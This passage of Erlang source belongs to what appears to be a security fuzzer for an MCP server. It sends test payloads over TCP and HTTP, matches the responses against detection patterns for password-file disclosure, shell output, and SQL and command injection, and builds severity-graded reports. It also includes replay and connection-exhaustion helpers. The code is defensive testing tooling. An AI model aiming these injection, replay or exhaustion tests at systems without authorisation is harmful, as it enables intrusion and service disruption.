                                {ok, Response};
                            {error, timeout} ->
                                {error, timeout};
                            {error, Reason} ->
                                {error, {recv_error, Reason}}
                        end;
                    {error, Reason} ->
                        {error, {send_error, Reason}}
                end
            after
                gen_tcp:close(Socket)
            end;
        {error, Reason} ->
            {error, {connect_error, Reason}}
    end.

send_http_payload(Payload, State) ->
    Host = State#fuzz_state.target_host,
    Port = State#fuzz_state.target_port,
    
    Url = "http://" ++ Host ++ ":" ++ integer_to_list(Port) ++ "/",
    Headers = [{"Content-Type", "application/json"}],
    
    case httpc:request(post, {Url, Headers, "application/json", Payload}, 
                      [{timeout, 10000}], [{body_format, binary}]) of
        {ok, {{_Version, StatusCode, _ReasonPhrase}, ResponseHeaders, Body}} ->
            {ok, #{
                status_code => StatusCode,
                headers => ResponseHeaders,
                body => Body
            }};
        {error, Reason} ->
            {error, {http_error, Reason}}
    end.

send_websocket_payload(Payload, State) ->
    % WebSocket implementation would go here
    % For now, return placeholder
    {error, websocket_not_implemented}.

send_payload_timed(Transport, Payload, State) ->
    StartTime = erlang:system_time(microsecond),
    Result = send_payload(Transport, Payload, State),
    EndTime = erlang:system_time(microsecond),
    ResponseTime = EndTime - StartTime,
    {Result, ResponseTime}.

send_payload_sequence(Transport, PayloadList, State) ->
    [send_payload(Transport, Payload, State) || Payload <- PayloadList].

send_concurrent_payloads(Transport, PayloadList, State) ->
    Self = self(),
    Pids = [
        spawn(fun() ->
            Result = send_payload(Transport, Payload, State),
            Self ! {result, Payload, Result}
        end) || Payload <- PayloadList
    ],
    
    collect_concurrent_results(Pids, PayloadList, []).

collect_concurrent_results([], [], Acc) ->
    lists:reverse(Acc);
collect_concurrent_results(Pids, PayloadList, Acc) ->
    receive
        {result, Payload, Result} ->
            collect_concurrent_results(Pids, lists:delete(Payload, PayloadList), [{Payload, Result} | Acc])
    after 30000 -> % 30 second timeout
        timeout
    end.

%%%===================================================================
%%% Vulnerability Analysis
%%%===================================================================

analyze_response_for_vulnerability(AttackVector, Payload, Response, TraceId) ->
    case Response of
        {error, Reason} ->
            analyze_error_for_vulnerability(AttackVector, Payload, Reason, TraceId);
        {ok, ResponseData} ->
            analyze_success_response(AttackVector, Payload, ResponseData, TraceId);
        _ ->
            analyze_unexpected_response(AttackVector, Payload, Response, TraceId)
    end.

analyze_error_for_vulnerability(AttackVector, Payload, Reason, TraceId) ->
    SecurityIndicators = extract_security_indicators_from_error(Reason),
    
    case SecurityIndicators of
        [] ->
            no_vulnerability;
        Indicators ->
            Severity = classify_severity(AttackVector, Indicators),
            create_vulnerability_record(AttackVector, Payload, Reason, TraceId, Indicators, Severity)
    end.

analyze_success_response(AttackVector, Payload, ResponseData, TraceId) ->
    SecurityIndicators = extract_security_indicators(ResponseData),
    
    case SecurityIndicators of
        [] ->
            no_vulnerability;
        Indicators ->
            Severity = classify_severity(AttackVector, Indicators),
            create_vulnerability_record(AttackVector, Payload, ResponseData, TraceId, Indicators, Severity)
    end.

analyze_unexpected_response(AttackVector, Payload, Response, TraceId) ->
    % Unexpected response format might indicate vulnerability
    Indicators = [unexpected_response_format],
    Severity = medium,
    create_vulnerability_record(AttackVector, Payload, Response, TraceId, Indicators, Severity).

extract_security_indicators(ResponseData) when is_binary(ResponseData) ->
    Indicators = [],
    
    % Check for error messages that reveal information
    ErrorPatterns = [
        {<<"ORA-">>, oracle_error},
        {<<"MySQL">>, mysql_error},
        {<<"PostgreSQL">>, postgres_error},
        {<<"SQLite">>, sqlite_error},
        {<<"stack trace">>, stack_trace_disclosure},
        {<<"Exception">>, exception_disclosure},
        {<<"Warning">>, warning_disclosure},
        {<<"Fatal error">>, fatal_error_disclosure},
        {<<"Access denied">>, access_denied},
        {<<"Permission denied">>, permission_denied},
        {<<"File not found">>, path_traversal_success},
        {<<"/etc/passwd">>, file_disclosure},
        {<<"root:x:">>, passwd_file_disclosure},
        {<<"admin">>, potential_admin_disclosure},
        {<<"password">>, password_disclosure}
    ],
    
    lists:foldl(fun({Pattern, Indicator}, Acc) ->
        case binary:match(ResponseData, Pattern) of
            nomatch -> Acc;
            _ -> [Indicator | Acc]
        end
    end, Indicators, ErrorPatterns);

extract_security_indicators(ResponseMap) when is_map(ResponseMap) ->
    StatusCode = maps:get(status_code, ResponseMap, 0),
    Body = maps:get(body, ResponseMap, <<>>),
    
    StatusIndicators = case StatusCode of
        500 -> [internal_server_error];
        502 -> [bad_gateway];
        503 -> [service_unavailable];
        504 -> [gateway_timeout];
        _ -> []
    end,
    
    BodyIndicators = extract_security_indicators(Body),
    StatusIndicators ++ BodyIndicators;

extract_security_indicators(_) ->
    [].

extract_security_indicators_from_error(Reason) ->
    case Reason of
        timeout -> [timeout_vulnerability];
        {connect_error, econnrefused} -> [connection_refused];
        {send_error, closed} -> [connection_closed];
        {recv_error, closed} -> [connection_closed];
        _ -> []
    end.

classify_severity(AttackVector, Indicators) ->
    % Critical severity indicators
    CriticalIndicators = [
        passwd_file_disclosure,
        admin_disclosure,
        sql_injection_confirmed,
        command_injection_confirmed,
        buffer_overflow_confirmed
    ],
    
    % High severity indicators  
    HighIndicators = [
        stack_trace_disclosure,
        exception_disclosure,
        file_disclosure,
        database_error,
        authentication_bypass
    ],
    
    % Medium severity indicators
    MediumIndicators = [
        information_disclosure,
        timeout_vulnerability,
        resource_exhaustion,
        access_denied
    ],
    
    HasCritical = lists:any(fun(I) -> lists:member(I, CriticalIndicators) end, Indicators),
    HasHigh = lists:any(fun(I) -> lists:member(I, HighIndicators) end, Indicators),
    HasMedium = lists:any(fun(I) -> lists:member(I, MediumIndicators) end, Indicators),
    
    if
        HasCritical -> critical;
        HasHigh -> high;
        HasMedium -> medium;
        true -> low
    end.

create_vulnerability_record(AttackVector, Payload, Response, TraceId, Indicators, Severity) ->
    VulnId = generate_vulnerability_id(),
    
    #vulnerability{
        id = VulnId,
        type = AttackVector,
        severity = Severity,
        attack_vector = AttackVector,
        payload = iolist_to_binary(io_lib:format("~p", [Payload])),
        response = iolist_to_binary(io_lib:format("~p", [Response])),
        timestamp = erlang:system_time(millisecond),
        trace_id = TraceId,
        indicators = Indicators,
        exploit_confirmed = Severity =:= critical
    }.

analyze_sequence_response(AttackType, Sequence, Results, TraceId) ->
    % Analyze response sequence for protocol vulnerabilities
    case detect_protocol_anomalies(Results) of
        [] ->
            no_vulnerability;
        Anomalies ->
            Severity = classify_protocol_severity(AttackType, Anomalies),
            create_vulnerability_record(AttackType, Sequence, Results, TraceId, Anomalies, Severity)
    end.

detect_protocol_anomalies(Results) ->
    Anomalies = [],
    
    % Check for state confusion
    StateAnomalies = detect_state_anomalies(Results),
    
    % Check for timing anomalies  
    TimingAnomalies = detect_timing_anomalies(Results),
    
    % Check for response inconsistencies
    ConsistencyAnomalies = detect_consistency_anomalies(Results),
    
    StateAnomalies ++ TimingAnomalies ++ ConsistencyAnomalies.

detect_state_anomalies(_Results) ->
    % Implementation for state anomaly detection
    [].

detect_timing_anomalies(_Results) ->
    % Implementation for timing anomaly detection
    [].

detect_consistency_anomalies(_Results) ->
    % Implementation for consistency anomaly detection
    [].

classify_protocol_severity(_AttackType, _Anomalies) ->
    medium. % Placeholder

analyze_race_condition_results(Payloads, Results, TraceId) ->
    % Analyze concurrent request results for race conditions
    case detect_race_conditions(Results) of
        [] ->
            no_vulnerability;
        RaceConditions ->
            Severity = high, % Race conditions are typically high severity
            create_vulnerability_record(race_condition, Payloads, Results, TraceId, RaceConditions, Severity)
    end.

detect_race_conditions(_Results) ->
    % Implementation for race condition detection
    [].

analyze_timing_vulnerability(Payload, Result, ResponseTime, TraceId) ->
    % Analyze timing for potential side-channel attacks
    case is_timing_anomaly(ResponseTime) of
        false ->
            no_vulnerability;
        true ->
            Indicators = [timing_side_channel],
            Severity = medium,
            create_vulnerability_record(timing_attack, Payload, {Result, ResponseTime}, TraceId, Indicators, Severity)
    end.

is_timing_anomaly(ResponseTime) ->
    % Consider response times over 5 seconds as anomalous
    ResponseTime > 5000000. % 5 seconds in microseconds

analyze_resource_exhaustion(ResourceType, TestResult, TraceId) ->
    case TestResult of
        {error, timeout} ->
            Indicators = [resource_exhaustion, service_unavailable],
            Severity = high,
            create_vulnerability_record(ResourceType, <<"resource_test">>, TestResult, TraceId, Indicators, Severity);
        {error, _} ->
            Indicators = [resource_stress],
            Severity = medium,
            create_vulnerability_record(ResourceType, <<"resource_test">>, TestResult, TraceId, Indicators, Severity);
        _ ->
            no_vulnerability
    end.

analyze_cpu_exhaustion(Payload, Result, ProcessingTime, TraceId) ->
    case ProcessingTime > 10000000 of % 10 seconds
        true ->
            Indicators = [cpu_exhaustion, algorithmic_complexity_attack],
            Severity = high,
            create_vulnerability_record(cpu_exhaustion, Payload, {Result, ProcessingTime}, TraceId, Indicators, Severity);
        false ->
            no_vulnerability
    end.

%%%===================================================================
%%% Comprehensive Fuzzing Campaign
%%%===================================================================

execute_comprehensive_fuzzing(Transport, Iterations, Options, State) ->
    StartTime = erlang:system_time(millisecond),
    
    % Run all fuzzing categories
    InputResults = execute_input_fuzzing(Transport, Iterations div 3, State),
    ProtocolResults = execute_protocol_fuzzing(Transport, Iterations div 3, State),
    ResourceResults = execute_resource_fuzzing(Transport, [], State),
    
    AllResults = InputResults ++ ProtocolResults ++ ResourceResults,
    
    EndTime = erlang:system_time(millisecond),
    Duration = EndTime - StartTime,
    
    % Generate comprehensive report
    Report = #{
        fuzzing_session => #{
            start_time => StartTime,
            end_time => EndTime,
            duration_ms => Duration,
            total_iterations => Iterations,
            transport => Transport
        },
        results => #{
            input_fuzzing => #{
                vulnerabilities => length(InputResults),
                results => InputResults
            },
            protocol_fuzzing => #{
                vulnerabilities => length(ProtocolResults),
                results => ProtocolResults
            },
            resource_fuzzing => #{
                vulnerabilities => length(ResourceResults),
                results => ResourceResults
            }
        },
        summary => #{
            total_vulnerabilities => length(AllResults),
            critical_findings => length([V || V <- AllResults, V#vulnerability.severity =:= critical]),
            high_findings => length([V || V <- AllResults, V#vulnerability.severity =:= high]),
            medium_findings => length([V || V <- AllResults, V#vulnerability.severity =:= medium]),
            low_findings => length([V || V <- AllResults, V#vulnerability.severity =:= low])
        },
        recommendations => generate_security_recommendations(AllResults),
        attack_traces => export_all_attack_traces(State)
    },
    
    ?LOG_INFO("Comprehensive fuzzing completed: ~p vulnerabilities found in ~p ms", 
              [length(AllResults), Duration]),
    
    Report.

generate_security_recommendations(Vulnerabilities) ->
    RecommendationMap = #{
        sql_injection => <<"Implement parameterized queries and input validation">>,
        command_injection => <<"Sanitize all user input and use safe command execution APIs">>,
        buffer_overflow => <<"Implement proper bounds checking and use safe string functions">>,
        path_traversal => <<"Validate and sanitize file paths, use whitelist approach">>,
        xss_injection => <<"Implement proper output encoding and Content Security Policy">>,
        session_hijacking => <<"Use secure session management and HTTPS encryption">>,
        resource_exhaustion => <<"Implement rate limiting and resource quotas">>,
        timing_attack => <<"Use constant-time algorithms for sensitive operations">>,
        race_condition => <<"Implement proper synchronization and atomic operations">>
    },
    
    VulnTypes = lists:usort([V#vulnerability.type || V <- Vulnerabilities]),
    [maps:get(Type, RecommendationMap, <<"Review security implementation">>) || Type <- VulnTypes].

%%%===================================================================
%%% Reporting and Export Functions
%%%===================================================================

generate_security_report(json, State) ->
    Vulnerabilities = ets:tab2list(State#fuzz_state.vulnerability_database),
    AttackTraces = ets:tab2list(State#fuzz_state.attack_traces),
    
    Report = #{
        report_type => <<"security_fuzzing_report">>,
        generated_at => erlang:system_time(millisecond),
        vulnerabilities => [vulnerability_to_map(V) || V <- Vulnerabilities],
        attack_traces => [trace_to_map(T) || T <- AttackTraces],
        statistics => generate_statistics(Vulnerabilities),
        recommendations => generate_security_recommendations(Vulnerabilities)
    },
    
    jsx:encode(Report);

generate_security_report(xml, State) ->
    JsonReport = generate_security_report(json, State),
    ReportMap = jsx:decode(JsonReport, [return_maps]),
    map_to_xml(ReportMap);

generate_security_report(markdown, State) ->
    Vulnerabilities = ets:tab2list(State#fuzz_state.vulnerability_database),
    
    Report = [
        <<"# Security Fuzzing Report\n\n">>,
        <<"Generated: ">>, format_timestamp(erlang:system_time(millisecond)), <<"\n\n">>,
        <<"## Summary\n\n">>,
        generate_markdown_summary(Vulnerabilities),
        <<"\n## Vulnerabilities\n\n">>,
        [vulnerability_to_markdown(V) || V <- Vulnerabilities],
        <<"\n## Recommendations\n\n">>,
        generate_markdown_recommendations(Vulnerabilities)
    ],
    
    iolist_to_binary(Report).

vulnerability_to_map(#vulnerability{} = V) ->
    #{
        id => V#vulnerability.id,
        type => atom_to_binary(V#vulnerability.type),
        severity => atom_to_binary(V#vulnerability.severity),
        attack_vector => atom_to_binary(V#vulnerability.attack_vector),
        payload => V#vulnerability.payload,
        response => V#vulnerability.response,
        timestamp => V#vulnerability.timestamp,
        trace_id => V#vulnerability.trace_id,
        indicators => [atom_to_binary(I) || I <- V#vulnerability.indicators],
        exploit_confirmed => V#vulnerability.exploit_confirmed
    }.

trace_to_map(#attack_trace{} = T) ->
    #{
        trace_id => T#attack_trace.trace_id,
        attack_type => atom_to_binary(T#attack_trace.attack_type),
        payload_sequence => T#attack_trace.payload_sequence,
        response_sequence => T#attack_trace.response_sequence,
        timing_data => T#attack_trace.timing_data,
        security_breach => T#attack_trace.security_breach,
        vulnerability_score => T#attack_trace.vulnerability_score
    }.

vulnerability_to_markdown(#vulnerability{} = V) ->
    [
        <<"### ">>, V#vulnerability.id, <<" - ">>, atom_to_binary(V#vulnerability.type), <<"\n\n">>,
        <<"**Severity:** ">>, atom_to_binary(V#vulnerability.severity), <<"\n">>,
        <<"**Attack Vector:** ">>, atom_to_binary(V#vulnerability.attack_vector), <<"\n">>,
        <<"**Timestamp:** ">>, format_timestamp(V#vulnerability.timestamp), <<"\n">>,
        <<"**Indicators:** ">>, format_indicators(V#vulnerability.indicators), <<"\n">>,
        <<"**Exploit Confirmed:** ">>, atom_to_binary(V#vulnerability.exploit_confirmed), <<"\n\n">>,
        <<"**Payload:**\n```\n">>, V#vulnerability.payload, <<"\n```\n\n">>,
        <<"**Response:**\n```\n">>, V#vulnerability.response, <<"\n```\n\n">>
    ].

generate_markdown_summary(Vulnerabilities) ->
    Total = length(Vulnerabilities),
    Critical = length([V || V <- Vulnerabilities, V#vulnerability.severity =:= critical]),
    High = length([V || V <- Vulnerabilities, V#vulnerability.severity =:= high]),
    Medium = length([V || V <- Vulnerabilities, V#vulnerability.severity =:= medium]),
    Low = length([V || V <- Vulnerabilities, V#vulnerability.severity =:= low]),
    
    [
        <<"- **Total Vulnerabilities:** ">>, integer_to_binary(Total), <<"\n">>,
        <<"- **Critical:** ">>, integer_to_binary(Critical), <<"\n">>,
        <<"- **High:** ">>, integer_to_binary(High), <<"\n">>,
        <<"- **Medium:** ">>, integer_to_binary(Medium), <<"\n">>,
        <<"- **Low:** ">>, integer_to_binary(Low), <<"\n">>
    ].

generate_markdown_recommendations(Vulnerabilities) ->
    Recommendations = generate_security_recommendations(Vulnerabilities),
    [[<<"- ">>, Rec, <<"\n">>] || Rec <- Recommendations].

export_traces_to_file(Format, File, State) ->
    AttackTraces = ets:tab2list(State#fuzz_state.attack_traces),
    
    case Format of
        <<"json">> ->
            TraceData = jsx:encode([trace_to_map(T) || T <- AttackTraces]),
            file:write_file(File, TraceData);
        <<"csv">> ->
            CsvData = traces_to_csv(AttackTraces),
            file:write_file(File, CsvData);
        _ ->
            {error, unsupported_format}
    end.

traces_to_csv(AttackTraces) ->
    Header = <<"trace_id,attack_type,security_breach,vulnerability_score\n">>,
    
    Rows = [
        <<
            (T#attack_trace.trace_id)/binary, ",",
            (atom_to_binary(T#attack_trace.attack_type))/binary, ",",
            (atom_to_binary(T#attack_trace.security_breach))/binary, ",",
            (float_to_binary(T#attack_trace.vulnerability_score, [{decimals, 2}]))/binary, "\n"
        >>
        || T <- AttackTraces
    ],
    
    iolist_to_binary([Header | Rows]).

export_all_attack_traces(State) ->
    AttackTraces = ets:tab2list(State#fuzz_state.attack_traces),
    [trace_to_map(T) || T <- AttackTraces].

%%%===================================================================
%%% Helper Functions
%%%===================================================================

get_attack_vectors() ->
    [
        buffer_overflow,
        sql_injection,
        command_injection,
        path_traversal,
        xss_injection,
        json_manipulation,
        format_string,
        integer_overflow,
        unicode_bypass,
        null_byte_injection,
        invalid_sequence,
        out_of_order,
        replay_attack,
        session_hijacking,
        race_condition,
        timing_attack,
        state_confusion,
        protocol_downgrade,
        connection_exhaustion,
        memory_exhaustion,
        cpu_exhaustion,
        disk_exhaustion
    ].

generate_trace_id() ->
    base64:encode(crypto:strong_rand_bytes(16)).

generate_vulnerability_id() ->
    Timestamp = integer_to_binary(erlang:system_time(millisecond)),
    Random = base64:encode(crypto:strong_rand_bytes(8)),
    <<"VULN-", Timestamp/binary, "-", Random/binary>>.

record_attack_trace(TraceId, AttackType, Payload, Result, State) ->
    Trace = #attack_trace{
        trace_id = TraceId,
        attack_type = AttackType,
        payload_sequence = [iolist_to_binary(io_lib:format("~p", [Payload]))],
        response_sequence = [iolist_to_binary(io_lib:format("~p", [Result]))],
        timing_data = [erlang:system_time(microsecond)],
        security_breach = is_security_breach(Result),
        vulnerability_score = calculate_vulnerability_score(AttackType, Result)
    },
    
    ets:insert(State#fuzz_state.attack_traces, Trace).

is_security_breach({error, _}) -> true;
is_security_breach({ok, Response}) ->
    SecurityIndicators = extract_security_indicators(Response),
    length(SecurityIndicators) > 0;
is_security_breach(_) -> false.

calculate_vulnerability_score(AttackType, Result) ->
    BaseScore = case AttackType of
        sql_injection -> 0.9;
        command_injection -> 0.9;
        buffer_overflow -> 0.8;
        path_traversal -> 0.7;
        xss_injection -> 0.6;
        _ -> 0.5
    end,
    
    ResponseMultiplier = case Result of
        {error, _} -> 1.5;
        _ -> 1.0
    end,
    
    min(1.0, BaseScore * ResponseMultiplier).

update_state_with_results(State, Results) ->
    Vulnerabilities = [V || V <- Results, V =/= no_vulnerability],
    
    % Store vulnerabilities in ETS
    [ets:insert(State#fuzz_state.vulnerability_database, V) || V <- Vulnerabilities],
    
    % Update metrics
    NewMetrics = maps:update_with(vulnerabilities_found, 
        fun(Count) -> Count + length(Vulnerabilities) end,
        length(Vulnerabilities),
        State#fuzz_state.security_metrics),
    
    State#fuzz_state{
        security_metrics = NewMetrics,
        discovered_vulnerabilities = Vulnerabilities ++ State#fuzz_state.discovered_vulnerabilities
    }.

hold_connection(Transport, State) ->
    % Hold a connection open for resource exhaustion testing
    case send_payload(Transport, <<"hold">>, State) of
        {ok, _} ->
            timer:sleep(30000); % Hold for 30 seconds
        _ ->
            timer:sleep(1000)
    end.

capture_valid_sequence(_Transport, _State) ->
    % Capture valid traffic sequence for replay attacks
    % This is a placeholder - in real implementation, this would
    % capture actual valid protocol exchanges
    [
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"authenticate\", \"params\": {\"username\": \"user\", \"password\": \"pass\"}, \"id\": 1}">>,
        <<"{\"jsonrpc\": \"2.0\", \"method\": \"get_data\", \"params\": {}, \"id\": 2}">>
    ].

modify_for_replay(Sequence) ->
    % Modify captured sequence for replay attack
    % Add slight modifications to test replay protection
    [
        case binary:match(Payload, <<"id\": 1">>) of
            nomatch -> Payload;
            _ -> binary:replace(Payload, <<"id\": 1">>, <<"id\": 999">>)
        end || Payload <- Sequence
    ].

generate_statistics(Vulnerabilities) ->
    #{
        total => length(Vulnerabilities),
        by_severity => #{
            critical => length([V || V <- Vulnerabilities, V#vulnerability.severity =:= critical]),
            high => length([V || V <- Vulnerabilities, V#vulnerability.severity =:= high]),
            medium => length([V || V <- Vulnerabilities, V#vulnerability.severity =:= medium]),
            low => length([V || V <- Vulnerabilities, V#vulnerability.severity =:= low])
        },
        by_type => calculate_type_distribution(Vulnerabilities),
        exploit_confirmed => length([V || V <- Vulnerabilities, V#vulnerability.exploit_confirmed])
    }.

calculate_type_distribution(Vulnerabilities) ->
    Types = [V#vulnerability.type || V <- Vulnerabilities],
    lists:foldl(fun(Type, Acc) ->
        maps:update_with(Type, fun(Count) -> Count + 1 end, 1, Acc)
    end, #{}, Types).

format_timestamp(Timestamp) ->
    {{Year, Month, Day}, {Hour, Minute, Second}} = 
        calendar:system_time_to_universal_time(Timestamp, millisecond),
    io_lib:format("~4..0w-~2..0w-~2..0w ~2..0w:~2..0w:~2..0w UTC",
                  [Year, Month, Day, Hour, Minute, Second]).

format_indicators(Indicators) ->
    iolist_to_binary(string:join([atom_to_list(I) || I <- Indicators], ", ")).

map_to_xml(_Map) ->
    % Placeholder for XML generation
    <<"<xml>XML generation not implemented</xml>">>.

%%%===================================================================
%%% OpenTelemetry Integration
%%%===================================================================

-ifdef(OTP_RELEASE).
-if(?OTP_RELEASE >= 24).

start_security_span(SpanName) ->
    otel_tracer:start_span(SpanName, #{
        kind => ?SPAN_KIND_INTERNAL,
        attributes => #{
            <<"component">> => <<"erlmcp_security_fuzzer">>,
            <<"operation">> => SpanName
        }
    }).

start_attack_span(AttackType, TraceId) ->
    SpanName = iolist_to_binary([<<"attack_">>, atom_to_binary(AttackType)]),
    otel_tracer:start_span(SpanName, #{
        kind => ?SPAN_KIND_INTERNAL,
        attributes => #{
            <<"component">> => <<"erlmcp_security_fuzzer">>,
            <<"attack.type">> => atom_to_binary(AttackType),
            <<"attack.trace_id">> => TraceId
        }
    }).

add_span_attributes(SpanCtx, Attributes) ->
    otel_span:set_attributes(SpanCtx, maps:to_list(Attributes)).

end_security_span(SpanCtx) ->
    otel_span:end_span(SpanCtx).

-else.

start_security_span(_SpanName) -> undefined.
start_attack_span(_AttackType, _TraceId) -> undefined.
add_span_attributes(_SpanCtx, _Attributes) -> ok.
end_security_span(_SpanCtx) -> ok.

-endif.
-else.

start_security_span(_SpanName) -> undefined.
start_attack_span(_AttackType, _TraceId) -> undefined.
add_span_attributes(_SpanCtx, _Attributes) -> ok.
end_security_span(_SpanCtx) -> ok.

-endif.

%%%===================================================================
%%% Classification and Reporting Functions (continued)
%%%===================================================================

classify_vulnerability(AttackVector, SecurityIndicators) ->
    % Advanced vulnerability classification based on attack vector and indicators
    VulnClass = case AttackVector of
        sql_injection when length([I || I <- SecurityIndicators, 
                                  lists:member(I, [oracle_error, mysql_error, postgres_error, sqlite_error])]) > 0 ->
            {confirmed_sql_injection, critical};
        
        command_injection when length([I || I <- SecurityIndicators,
                                      lists:member(I, [command_execution, shell_access])]) > 0 ->
            {confirmed_command_injection, critical};
        
        buffer_overflow when length([I || I <- SecurityIndicators,
                                    lists:member(I, [segmentation_fault, memory_corruption])]) > 0 ->
            {confirmed_buffer_overflow, critical};
        
        path_traversal when lists:member(passwd_file_disclosure, SecurityIndicators) ->
            {confirmed_path_traversal, critical};
        
        xss_injection when lists:member(script_execution, SecurityIndicators) ->
            {confirmed_xss, high};
        
        session_hijacking when lists:member(authentication_bypass, SecurityIndicators) ->
            {confirmed_session_hijack, high};
        
        _ when length(SecurityIndicators) > 0 ->
            {potential_vulnerability, medium};
        
        _ ->
            {no_vulnerability, none}
    end,
    
    VulnClass.

extract_security_indicators(Data) when is_map(Data) ->
    % Extract indicators from structured response data
    extract_map_indicators(Data);

extract_security_indicators(Data) when is_list(Data) ->
    % Extract indicators from response list
    lists:flatten([extract_security_indicators(Item) || Item <- Data]);

extract_security_indicators(Data) when is_binary(Data) ->
    % Extract indicators from binary response
    extract_binary_indicators(Data);

extract_security_indicators(_) ->
    [].

extract_map_indicators(ResponseMap) ->
    Indicators = [],
    
    % Check status codes
    StatusIndicators = case maps:get(status_code, ResponseMap, 200) of
        500 -> [internal_server_error];
        502 -> [bad_gateway]; 
        503 -> [service_unavailable];
        504 -> [gateway_timeout];
        401 -> [authentication_required];
        403 -> [access_forbidden];
        _ -> []
    end,
    
    % Check response headers for security issues
    HeaderIndicators = case maps:get(headers, ResponseMap, []) of
        Headers when is_list(Headers) ->
            extract_header_indicators(Headers);
        _ -> []
    end,
    
    % Check response body
    BodyIndicators = case maps:get(body, ResponseMap, <<>>) of
        Body when is_binary(Body) ->
            extract_binary_indicators(Body);
        _ -> []
    end,
    
    StatusIndicators ++ HeaderIndicators ++ BodyIndicators.

extract_header_indicators(Headers) ->
    Indicators = [],
    
    % Check for security-related headers
    SecurityChecks = [
        {<<"server">>, fun(Value) -> 
            case binary:match(Value, [<<"Apache">>, <<"nginx">>, <<"IIS">>]) of
                nomatch -> [];
                _ -> [server_disclosure]
            end
        end},
        {<<"x-powered-by">>, fun(_) -> [technology_disclosure] end},
        {<<"set-cookie">>, fun(Value) ->
            case binary:match(Value, [<<"secure">>, <<"httponly">>, <<"samesite">>]) of
                nomatch -> [insecure_cookie];
                _ -> []
            end
        end}
    ],
    
    lists:foldl(fun({HeaderName, CheckFun}, Acc) ->
        case lists:keyfind(HeaderName, 1, Headers) of
            {_, Value} -> CheckFun(Value) ++ Acc;
            false -> Acc
        end
    end, Indicators, SecurityChecks).

extract_binary_indicators(ResponseData) ->
    % Comprehensive pattern matching for security indicators
    SecurityPatterns = [
        % Database errors
        {<<"ORA-\\d+">>, oracle_error},
        {<<"MySQL">>, mysql_error},
        {<<"PostgreSQL">>, postgres_error},
        {<<"SQLite">>, sqlite_error},
        {<<"Microsoft SQL Server">>, mssql_error},
        {<<"Warning: mysql_">>, mysql_warning},
        {<<"Warning: pg_">>, postgres_warning},
        
        % System disclosure
        {<<"/etc/passwd">>, passwd_file_disclosure},
        {<<"root:x:0:0">>, root_user_disclosure},
        {<<"\\[sudo\\] password">>, sudo_disclosure},
        {<<"Linux \\S+ \\d+">>, kernel_version_disclosure},
        {<<"Windows NT \\d+">>, windows_version_disclosure},
        
        % Application errors
        {<<"Fatal error">>, fatal_error_disclosure},
        {<<"Warning:">>, warning_disclosure},
        {<<"Notice:">>, notice_disclosure},
        {<<"Parse error">>, parse_error_disclosure},
        {<<"Uncaught exception">>, exception_disclosure},
        {<<"Stack trace">>, stack_trace_disclosure},
        
        % Directory listing
        {<<"Index of/">>, directory_listing},
        {<<"Parent Directory">>, parent_directory_access},
        
        % Authentication issues
        {<<"Access denied">>, access_denied},
        {<<"Permission denied">>, permission_denied},
        {<<"Authentication failed">>, authentication_failed},
        {<<"Invalid credentials">>, invalid_credentials},
        {<<"Login failed">>, login_failed},
        
        % Command execution indicators
        {<<"uid=\\d+">>, command_execution_success},
        {<<"bash: ">>, bash_shell_access},
        {<<"sh: ">>, shell_access},
        {<<"cmd.exe">>, windows_command_prompt},
        {<<"Cannot execute">>, command_execution_blocked},
        
        % File system access
        {<<"No such file or directory">>, file_not_found},
        {<<"Permission denied">>, file_permission_denied},
        {<<"Is a directory">>, directory_access_attempt},
        
        % Memory issues
        {<<"Segmentation fault">>, segmentation_fault},
        {<<"Memory allocation">>, memory_allocation_error},
        {<<"Buffer overflow">>, buffer_overflow_detected},
        {<<"Out of memory">>, out_of_memory},
        
        % Network issues  
        {<<"Connection refused">>, connection_refused},
        {<<"Connection timed out">>, connection_timeout},
        {<<"Host not found">>, host_resolution_error},
        
        % Injection success indicators
        {<<"SELECT \\* FROM">>, sql_query_executed},
        {<<"DROP TABLE">>, destructive_sql_executed},
        {<<"<script>">>, script_tag_present},
        {<<"javascript:">>, javascript_execution},
        {<<"eval\\(">>, eval_function_present}
    ],
    
    lists:foldl(fun({Pattern, Indicator}, Acc) ->
        case re:run(ResponseData, Pattern, [caseless]) of
            nomatch -> Acc;
            _ -> [Indicator | Acc]
        end
    end, [], SecurityPatterns).

create_attack_signature(AttackVector, Payload) ->
    % Create unique signature for attack pattern
    PayloadHash = crypto:hash(sha256, Payload),
    AttackVectorBin = atom_to_binary(AttackVector),
    
    Signature = <<AttackVectorBin/binary, ":", PayloadHash/binary>>,
    base64:encode(Signature).

%% @doc Create detailed attack report with forensic information
create_detailed_attack_report(Vulnerability, TraceData) ->
    AttackSignature = create_attack_signature(
        Vulnerability#vulnerability.attack_vector,
        Vulnerability#vulnerability.payload
    ),
    
    #{
        vulnerability => vulnerability_to_map(Vulnerability),
        attack_signature => AttackSignature,
        forensic_data => #{
            trace_id => Vulnerability#vulnerability.trace_id,
            timestamp => Vulnerability#vulnerability.timestamp,
            attack_pattern => analyze_attack_pattern(Vulnerability),
            payload_analysis => analyze_payload_structure(Vulnerability#vulnerability.payload),
            response_analysis => analyze_response_structure(Vulnerability#vulnerability.response),
            risk_assessment => assess_exploit_risk(Vulnerability)
        },
        trace_data => TraceData,
        mitigation_suggestions => generate_specific_mitigations(Vulnerability)
    }.

analyze_attack_pattern(#vulnerability{attack_vector = AttackVector, payload = Payload}) ->
    case AttackVector of
        sql_injection -> 
            analyze_sql_injection_pattern(Payload);
        command_injection -> 
            analyze_command_injection_pattern(Payload);
        buffer_overflow -> 
            analyze_buffer_overflow_pattern(Payload);
        path_traversal -> 
            analyze_path_traversal_pattern(Payload);
        _ -> 
            #{pattern => unknown, complexity => low}
    end.

analyze_sql_injection_pattern(Payload) ->
    Patterns = [
        {<<"' OR ">>, union_based},
        {<<"UNION SELECT">>, union_based},
        {<<"'; DROP ">>, destructive},
        {<<"WAITFOR DELAY">>, time_based},
        {<<"SLEEP\\(">>, time_based},
        {<<"BENCHMARK\\(">>, time_based},
        {<<"@@version">>, information_gathering},
        {<<"information_schema">>, information_gathering}
    ],
    
    DetectedPatterns = [Pattern || {Regex, Pattern} <- Patterns,
                                  re:run(Payload, Regex, [caseless]) =/= nomatch],
    
    #{
        type => sql_injection,
        patterns => DetectedPatterns,
        complexity => determine_complexity(DetectedPatterns),
        evasion_techniques => detect_evasion_techniques(Payload)
    }.

analyze_command_injection_pattern(Payload) ->
    CommandPatterns = [
        {<<"; ">>, command_chaining},
        {<<"|">>, pipe_operator},
        {<<"`">>, backtick_execution},
        {<<"$\\(">>, command_substitution},
        {<<"&&">>, logical_and},
        {<<"\\|\\|">>, logical_or}
